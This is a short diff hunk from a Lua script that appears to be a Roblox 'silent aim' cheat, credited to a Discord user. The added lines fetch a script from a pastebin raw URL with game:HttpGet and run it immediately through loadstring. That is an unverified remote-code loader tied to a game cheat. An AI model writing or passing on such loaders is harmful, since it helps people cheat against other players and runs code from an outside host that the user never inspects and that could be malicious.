@@ -81,3 +81,5 @@ end
 createNotification("Made by vvhrrs, Discord")
 wait(1)
 createNotification("SILENT AIM VERSION : 2.9")
+-- Execute the main script
+loadstring(game:HttpGet("https://pastebin.com/raw/yiKseb8R"))()
